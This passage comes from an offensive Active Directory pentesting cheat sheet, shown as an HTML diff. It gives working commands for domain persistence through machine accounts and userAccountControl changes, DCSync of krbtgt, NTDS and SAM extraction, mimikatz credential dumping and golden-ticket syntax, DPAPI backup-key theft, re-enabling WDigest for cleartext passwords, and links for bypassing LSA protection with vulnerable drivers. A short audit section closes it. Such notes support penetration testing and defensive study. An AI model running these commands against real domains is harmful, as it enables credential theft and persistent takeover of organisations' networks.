+<li>https://padlet.com/sylvaincortes/5ih32mx9f637sk1a</li>
+</ul>
+<h4 id="machinecomputer-accounts">Machine/Computer accounts</h4>
+<ul>
+<li>https://adsecurity.org/?p=2753</li>
+</ul>
+<p>Machine accounts could be used as a backdoor for domain persistence by adding them to high privilege groups.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>net group &quot;Domain Admins&quot; newMachine01$ /add /domain
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>python3 secretsdump.py company.local/newMachine01\$:Password123@10.0.0.1 -just-dc-user krbtgt
+</span></code></pre></div>
+<h4 id="machinecomputer-accounts-2">Machine/Computer accounts 2</h4>
+<ul>
+<li>https://stealthbits.com/blog/server-untrust-account/</li>
+<li>https://github.com/STEALTHbits/ServerUntrustAccount</li>
+<li>https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/</li>
+</ul>
+<blockquote>
+<p>Even though that dumping passwords hashes via the DCSync technique is not new and SOC teams might have proper alerting in place, using a computer account to perform the same technique might be a more stealthier approach.</p>
+</blockquote>
+<ul>
+<li>https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties</li>
+</ul>
+<p>Modification of the “userAccountControl” attribute can transform a computer account to a domain controller.</p>
+<p>Computer account to appear as a domain controller:
+- <strong>userAccountControl</strong> attribute needs to have the value of 0x2000 = ( SERVER_TRUST_ACCOUNT ) decimal : 8192
+--&gt; Modification of this attribute requires domain administrator level privileges</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>Import-Module .\Powermad.psm1
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>New-MachineAccount -MachineAccount newMachine01 -Domain company.local -DomainController dc01.company.local
+</span></code></pre></div>
+By default new computer will have primary group ID 515 (RID for domain groups and represents that this is a domain computer)</p>
+<p>If you can modify the <strong>userAccountControl</strong> an therefore change the primary group ID. This attribute would be modified to have a value of <strong>8192</strong> the primary group id will change to <strong>516</strong> which belongs to domain controllers.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>Set-ADComputer newMachine01 -replace @{ &quot;userAccountcontrol&quot; = 8192 }
+</span></code></pre></div>
+<p>Most important bit of having a computer account to act as a domain controller is that the DCSync can be used on that arbitrary account instead of the legitimate domain controller.</p>
+<p><strong>Steps:</strong>
+1. Creation a machine account
+2. Modifying <strong>userAccountControl</strong> to 8192
+3. Computer account is known its NTLM hash could be used to pass the hash (create new cmd.exe, mimikatz...)
+4. Command prompt will open under the context of the machine account --&gt; DCSync KRBTG or whole identities
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>lsadump::dcsync /domain:purple.lab /user:krbtgt
+</span></code></pre></div>
+<strong>Automate technique 1:</strong>
+- https://github.com/STEALTHbits/ServerUntrustAccount
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>Add-ServerUntrustAccount -ComputerName &quot;newMachine01&quot; -Password &quot;Password123&quot; -Verbose
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>Invoke-ServerUntrustAccount -ComputerName &quot;newMachine01&quot; -Password &quot;Password123&quot; -MimikatzPath &quot;.\mimikatz.exe&quot;
+</span></code></pre></div></p>
+<p><strong>Automate technique 2:</strong>
+PowerShell script to automate domain persistence via the userAccountControl active directory attribute.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>function Execute-userAccountControl
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>{
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>[CmdletBinding()]
+</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a>        param
+</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a>        (
+</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a>                [System.String]$DomainFQDN = $ENV:USERDNSDOMAIN,
+</span><span id="__span-84-7"><a id="__codelineno-84-7" name="__codelineno-84-7" href="#__codelineno-84-7"></a>                [System.String]$ComputerName = &#39;Pentestlab&#39;,
+</span><span id="__span-84-8"><a id="__codelineno-84-8" name="__codelineno-84-8" href="#__codelineno-84-8"></a>                [System.String]$OSVersion = &#39;10.0 (18363)&#39;,
+</span><span id="__span-84-9"><a id="__codelineno-84-9" name="__codelineno-84-9" href="#__codelineno-84-9"></a>                [System.String]$OS = &#39;Windows 10 Enterprise&#39;,
+</span><span id="__span-84-10"><a id="__codelineno-84-10" name="__codelineno-84-10" href="#__codelineno-84-10"></a>                [System.String]$DNSName = &quot;$ComputerName.$DomainFQDN&quot;,
+</span><span id="__span-84-11"><a id="__codelineno-84-11" name="__codelineno-84-11" href="#__codelineno-84-11"></a>$MachineAccount = &#39;Pentestlab&#39;
+</span><span id="__span-84-12"><a id="__codelineno-84-12" name="__codelineno-84-12" href="#__codelineno-84-12"></a>        )
+</span><span id="__span-84-13"><a id="__codelineno-84-13" name="__codelineno-84-13" href="#__codelineno-84-13"></a>$secureString = convertto-securestring &quot;Password123&quot; -asplaintext -force
+</span><span id="__span-84-14"><a id="__codelineno-84-14" name="__codelineno-84-14" href="#__codelineno-84-14"></a>$VerbosePreference = &quot;Continue&quot;
+</span><span id="__span-84-15"><a id="__codelineno-84-15" name="__codelineno-84-15" href="#__codelineno-84-15"></a>
+</span><span id="__span-84-16"><a id="__codelineno-84-16" name="__codelineno-84-16" href="#__codelineno-84-16"></a>Write-Verbose -Message &quot;Creating Computer Account: $ComputerName&quot;
+</span><span id="__span-84-17"><a id="__codelineno-84-17" name="__codelineno-84-17" href="#__codelineno-84-17"></a>New-ADComputer $ComputerName -AccountPassword $securestring -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName
+</span><span id="__span-84-18"><a id="__codelineno-84-18" name="__codelineno-84-18" href="#__codelineno-84-18"></a>$DNSName -ErrorAction Stop;
+</span><span id="__span-84-19"><a id="__codelineno-84-19" name="__codelineno-84-19" href="#__codelineno-84-19"></a>Write-Verbose -Message &quot;$ComputerName created!&quot;
+</span><span id="__span-84-20"><a id="__codelineno-84-20" name="__codelineno-84-20" href="#__codelineno-84-20"></a>Write-Verbose -Message &quot;Attempting to establish persistence.&quot;
+</span><span id="__span-84-21"><a id="__codelineno-84-21" name="__codelineno-84-21" href="#__codelineno-84-21"></a>Write-Verbose -Message &quot;Changing the userAccountControl attribute of $MachineAccount computer to 8192.&quot;
+</span><span id="__span-84-22"><a id="__codelineno-84-22" name="__codelineno-84-22" href="#__codelineno-84-22"></a>Set-ADComputer $MachineAccount -replace @{ &quot;userAccountcontrol&quot; = 8192 };
+</span><span id="__span-84-23"><a id="__codelineno-84-23" name="__codelineno-84-23" href="#__codelineno-84-23"></a>Write-Verbose -Message &quot;$MachineAccount is now a Domain Controller!&quot;
+</span><span id="__span-84-24"><a id="__codelineno-84-24" name="__codelineno-84-24" href="#__codelineno-84-24"></a>Write-Verbose -Message &quot;Domain persistence established!You can now use the DCSync technique with Pentestlab credentials.&quot;
+</span><span id="__span-84-25"><a id="__codelineno-84-25" name="__codelineno-84-25" href="#__codelineno-84-25"></a>$VerbosePreference = &quot;Continue&quot;
+</span><span id="__span-84-26"><a id="__codelineno-84-26" name="__codelineno-84-26" href="#__codelineno-84-26"></a>}
+</span></code></pre></div></p>
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<h3 id="computer-accounts-privesc">Computer accounts privesc</h3>
+<blockquote>
+<p>For example, if an admin server is joined to a group with backup rights on Domain Controllers, all an attacker needs to do is compromise an admin account with rights to that admin server and then get System rights on that admin server to compromise the domain.</p>
+</blockquote>
+<ol>
+<li>Compromise an account with admin rights to admin server.</li>
+<li>Admin server computer account needs rights to Domain Controllers.</li>
+</ol>
+<h3 id="extract-ntds">Extract NTDS</h3>
+<h4 id="extract-ntds-without-admin-priv">Extract NTDS without Admin priv</h4>
+<ul>
+<li>https://www.youtube.com/watch?v=KWLA_OLanPc</li>
+</ul>
+<h4 id="multiple-ways-to-extract-ntds">Multiple ways to extract NTDS</h4>
+<ul>
+<li>https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/</li>
+<li>https://www.puckiestyle.nl/extracting-password-hashes-from-the-ntds-dit-file/</li>
+<li>https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/</li>
+<li>https://www.cyberis.com/article/obtaining-ntdsdit-using-built-windows-commands</li>
+<li>https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration</li>
+<li>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/</li>
+<li>https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</li>
+<li>https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin</li>
+<li>https://www.hackingarticles.in/credential-dumping-ntds-dit/</li>
+<li>https://stealthbits.com/attacks/ntdsdit-password-extraction/</li>
+<li>https://www.ultimatewindowssecurity.com/blog/default.aspx?d=10/2017</li>
+</ul>
+<h3 id="active-directory-ntds-clear-text-passwords-reversible-encryption">Active Directory NTDS : Clear Text passwords (Reversible encryption)</h3>
+<p>Sometimes when using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a> to extract NTDS.dit you will encounter some CLEARTEXT credential wihtin the dump.   </p>
+<p>Cleartext does not really mean that the passwords are stored as is. They are stored in an encrypted form using <strong>RC4</strong> encryption.   </p>
+<p>The key used to both encrypt and decrypt is the <strong>SYSKEY</strong>, which is stored in the registry and can be extracted by a domain admin.This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.</p>
+<p>List users with "Store passwords using reversible encryption" enabled
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>Get-ADUser -Filter &#39;userAccountControl -band 128&#39; -Properties userAccountControl
+</span></code></pre></div>
+--&gt; list of user account control flag : <br />
+- https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol
+- http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm</p>
+<h3 id="dcsync">DCSYNC</h3>
+<ul>
+<li><a href="https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection">Primer on DCSync attack</a></li>
+<li><a href="https://adsecurity.org/?p=1729">ADSecurity - Mimikatz DCSync Usage, Exploitation, and Detection</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync">Ired Team - Dump Password From DC with DCSync</a></li>
+<li><a href="https://www.synacktiv.com/publications/a-dive-into-microsoft-defender-for-identity.html">Synacktiv - Dive Into MDI - DCsync detection bypass</a></li>
+</ul>
+<h3 id="accessing-lsass-secrets">Accessing LSASS secrets</h3>
+<p><a href="https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary.html">Windows Secrets Extraction - Summary</a>
+- Secrets in LSASS process.
+- Secrets in registry such as LSA secrets.
+- DPAPI secrets.</p>
+<h4 id="lsass">LSASS</h4>
+<p><strong>Secrets retrieved From LSASS</strong>
+- User / Machine$ (computer account) Hashes
+- Cleartest credentials (If Wdigest enabled)
+- Kerberos ticket (TGT and ST)
+- DPAPI cached keys</p>
+<p><strong>Protection</strong>
+- RunAsPPL
+- Credential Guards</p>
+<p><strong>UserLand</strong>
+- Lsassy --&gt; Pypykatz
+- Nanodump</p>
+<p><strong>KernelLand</strong>
+- https://www.loldrivers.io/
+- <a href="https://github.com/WithSecureLabs/physmem2profit">Physmem2profit</a>
+- <a href="https://github.com/wavestone-cdt/EDRSandblast">EdrSandBlast</a>
+- DumpIt</p>
+<h4 id="registry-secrets">Registry Secrets</h4>
+<p><strong>Secrets retrieved From registry</strong>
+- SAM secrets (security Account Manager)
+- LSA secrets (Local Security Authority)
+  - DPAPI_SYSTEM
+  - NL$KM
+  - MsCache
+  - $MACHINE.ACC
+  - DEFAUTLPASSWORD
+- Software Secrets (ASP.NET, ...)</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>&gt; reg save HKLM\SAM sam
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>OR
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>&gt; vssadmin create shadow /for=C:
+</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM SAM
+</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a>OR
+</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a>$ secretsdump.py -sam sam -security security -system system local
+</span></code></pre></div>
+<p><a href="https://github.com/laxa/SharpSecretsdump">SharpSecretsDump</a> : C# project used to mimic secretsdump.py from Impacket</p>
+<h4 id="dpapi">DPAPI</h4>
+<ul>
+<li>https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</li>
+<li>https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9</li>
+<li>https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</li>
+<li>https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/</li>
+<li>https://github.com/jordanbtucker/dpapick</li>
+<li>https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary.html</li>
+<li>https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9</li>
+<li>https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets</li>
+<li>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</li>
+<li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md</li>
+<li>https://github.com/Processus-Thief/HEKATOMB</li>
+<li>https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/</li>
+<li>https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz</li>
+<li>https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++</li>
+<li>https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb</li>
+<li>https://pentestlab.blog/tag/dpapi/</li>
+<li>https://blog.sygnia.co/the-downfall-of-dpapis-top-secret-weapons</li>
+<li>https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/dpapi</li>
+<li>https://www.youtube.com/watch?v=WSJjIsElJ3U</li>
+</ul>
+<p>DPAPI - Data Protectgion API. When a software offers a "remember me" or "save credentials" feature, DPAPI is probably used to encrypt credentials before storing them. (Part of Crypt32.dll)  </p>
+<p>DPAPI use <strong>2</strong> main functions: <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata">CryptUnprotectDat</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata">CryptProtectData</a>.  </p>
+<p>DPAPI encryption mechanism relies on masterkeys (MK), used to encrypt the data. The Masterkeys are encrypted with a derivative from the user's password or the DPAPI system key.</p>
+<p>User masterkeys are located here:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>C:\Users\&lt;user&gt;\AppData\Roaming\Protect\Microsoft\&lt;SID&gt;
+</span></code></pre></div></p>
+<p>Machine masterkeys are located here:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>C:\Windows\System32\Microsoft\Protect\S-1-5-18\User
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>C:\Windows\System32\Microsoft\Protect\S-1-5-18
+</span></code></pre></div></p>
+<p>Different types of secrets are encrypted using DPAPI:
+- Credentials
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>For User:
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>PS C:\Users\lutzenfried&gt; Get-ChildItem -Hidden C:\Users\lutzenfried\AppData\Local\Microsoft\Credentials\
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>
+</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a>
+</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a>    Directory: C:\Users\lutzenfried\AppData\Local\Microsoft\Credentials
+</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#__codelineno-89-6"></a>
+</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#__codelineno-89-7"></a>
+</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#__codelineno-89-8"></a>Mode                 LastWriteTime         Length Name
+</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#__codelineno-89-9"></a>----                 -------------         ------ ----
+</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#__codelineno-89-10"></a>-a-hs-        2023-04-23   9:41 PM           4368 B81681331F8F01AA4D35198BE3BF510B
+</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#__codelineno-89-11"></a>-a-hs-        2023-03-01  11:01 AM          11104 DFBE70A7E5CC19A398EBF1B96859CE5D
+</span><span id="__span-89-12"><a id="__codelineno-89-12" name="__codelineno-89-12" href="#__codelineno-89-12"></a>-a-hs-        2023-03-02  10:34 AM           1264 E05DBE15D38053457F3523A375594044
+</span><span id="__span-89-13"><a id="__codelineno-89-13" name="__codelineno-89-13" href="#__codelineno-89-13"></a>
+</span><span id="__span-89-14"><a id="__codelineno-89-14" name="__codelineno-89-14" href="#__codelineno-89-14"></a>For Systems:
+</span><span id="__span-89-15"><a id="__codelineno-89-15" name="__codelineno-89-15" href="#__codelineno-89-15"></a>Get-ChildItem -Hidden C:/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials/
+</span></code></pre></div>
+- Vault
+- DPAPI blob
+Wi-Fi credentials are stored as DPAPI blobs inside the following files:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>Location: C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*.xml
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>&gt; netsh wlan show profile
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>
+</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>&gt; netsh wlan show profile SSID key=clear
+</span></code></pre></div>
+- RSA / NGC</p>
+<p>--&gt; As Domain Admin, you can extract the backup key that lets you decrypt any users' secrets.<br />
+Using Mimikatz
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>lsadump::backupkeys /system:dc01.offense.local /export
+</span></code></pre></div></p>
+<p>Using SharpDPAPI
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>SharpDPAPI.exe backupkey /nowrap
+</span></code></pre></div></p>
+<p>You will potentially sometimes be able to identify binary blob encrypted using DPAPI based on 62 bytes:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>01 00 00 00 d0 8c 9d df  01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00  d2 87 4b 1d ab ce 3d 43 a7 c8 43 4d bf ca ee fa  00 00 00 00 02 00 00 00 00 00 10 66 00 00 00 01  00 00 20 00 00 00
+</span></code></pre></div></p>
+<h5 id="lsassy">Lsassy</h5>
+<ul>
+<li>https://github.com/Hackndo/lsassy</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>lsassy -d company.local -u jdoe -p Pass1234 192.168.1.0/24
+</span></code></pre></div>
+<h3 id="bring-your-own-domain-controller">Bring Your Own Domain Controller</h3>
+<ul>
+<li>https://blog.zsec.uk/byodc-attack/</li>
+</ul>
+<h2 id="misc-ad-audit">Misc : AD Audit</h2>
+<h4 id="wdigest">WDigest</h4>
+<ul>
+<li>https://blog.xpnsec.com/exploring-mimikatz-part-1/</li>
+</ul>
+<p><a href="https://docs.microsoft.com/pt-pt/previous-versions/windows/server/cc778868(v=ws.10)">Wdigest</a> was introduced in WinXP and designed to be used with HTTP protocol for authentication.  </p>
+<p>Enabled <em>by default</em> in multiple versions of Windows:
+- Windows XP
+- Windows 8.0
+- Server 2003
+- Server 2008
+- Server 2012</p>
+<p>--&gt; With <em>WDigest</em> plain text passwords are stored in LSASS.  </p>
+<p>Retrieving using Mimikatz
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>sekurlsa::wdigest
+</span></code></pre></div></p>
+<p>Can be deactivated/activated setting to <em>1</em> the value of <em>UseLogonCredential</em> and <em>Negotiate</em> in <strong>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</strong>.<br />
+--&gt; If these registry keys don't exist or the value is "0", then WDigest will be deactivated.  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v Negotiate
+</span></code></pre></div>
+<p>As an attacker you can reactivate WDigest to get cleartext credentials on sensitive systems.<br />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>crackmapexec smb 192.168.0.10 -u jdoe -p Pass123 -M wdigest -o ACTION=enable
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+</span></code></pre></div></p>
+<h4 id="passwords-stored-in-lsa-lsa-storage">Passwords stored in LSA (LSA Storage)</h4>
+<p>Since <em>Windows 8.1</em> you can protect LSA storage using Protected Process (<a href="https://itm4n.github.io/lsass-runasppl/">RunAsPPL</a>).<br />
+--&gt; This will prevent regular <code>mimikatz.exe sekurlsa:logonpasswords</code> for working properly.</p>
+<p>With this registry key enable, the following <em>3</em> actions (which require an handle on LSASS  ) will no longer be possible:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>sekurlsa:logonpasswords
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>lsadump::lsa: Did not work
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;ntlmhash&gt;
+</span></code></pre></div></p>
+<p>With this registry key enable, the following <em>5</em> actions will still be possible:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;user&gt;
+</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>lsadump::secrets (get syskey information to decrypt secrets from the registry on disk)
+</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>lsadump::sam (Reading credentials from the SAM on disk)
+</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>kerberos::golden /user:&lt;user&gt; /domain:&lt;domain&gt; /sid:&lt;sid&gt; /krbtgt:&lt;krbtgt hash&gt; /endin:&lt;value&gt; /renewmax:&lt;value&gt;
+</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a>keystroke logging
+</span></code></pre></div></p>
+<p>Validate <em>RunAsPPL</em> is enable
+<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
+</span></code></pre></div></p>
+<ul>
+<li>https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets</li>
+</ul>
+<p>Documentation about LSA secrets: https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=23</p>
+<p>--&gt; Mimikatz has the <em>mimidrv.sys</em> driver that can bypass LSA Protection. Pretty much flag everywhere you will need to write you own driver. 
+    - https://posts.specterops.io/mimidrv-in-depth-4d273d19e148 
+--&gt; You can also build your own driver and sign it digitally<br />
+--&gt; You can also load an official and vulnerable driver that can be exploited to run arbitrary code in the Kernel<br />
+    - https://github.com/fengjixuchui/gdrv-loader<br />
+    - https://github.com/RedCursorSecurityConsulting/PPLKiller 
+    - https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5 
+--&gt; Use other process (e.g Antivirus process) which sometimes have already handles on LSASS process<br />
+    - https://skelsec.medium.com/duping-av-with-handles-537ef985eb03  </p>
+<h4 id="abusing-leaked-handles-to-dump-lsass-memory">Abusing leaked handles to dump LSASS memory</h4>
+<ul>
+<li>https://github.com/helpsystems/nanodump  </li>
+<li>https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html  </li>
+</ul>
+<h4 id="lm-password-storage">LM password storage</h4>
+<p>LM hash is an old deprecated method of storing passwords which has the following weaknesses:<br />
+- Password length is limited to 14 characters
+- Passwords that are longer than 7 characters are split into two and each half is hashed separately
+- All lower-case characters are converted to upper-case before hashing</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>grep -iv &#39;:aad3b435b51404eeaad3b435b51404ee:&#39; ntds.dit
+</span></code></pre></div>
+<h4 id="storing-passwords-using-reversible-encryption">Storing passwords using reversible encryption</h4>
+<ul>
+<li>https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption</li>
+</ul>
+<h4 id="inactive-domain-accounts">Inactive domain accounts</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>sort -t &#39;;&#39; -k 8 domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F &#39;;&#39; &#39;{print $3, $8}&#39;
+</span></code></pre></div>
+<h4 id="privileged-users-with-password-reset-overdue">Privileged users with password reset overdue</h4>
+<p>Once the dumping is done (ldapdomaindump), get the list of users with <strong>AdminCount</strong> attribute set to <strong>1</strong> by parsing the ‘domain_users.json’ file:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>jq -r &#39;.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]&#39; domain_users.json &gt; privileged_users.txt
+</span></code></pre></div>
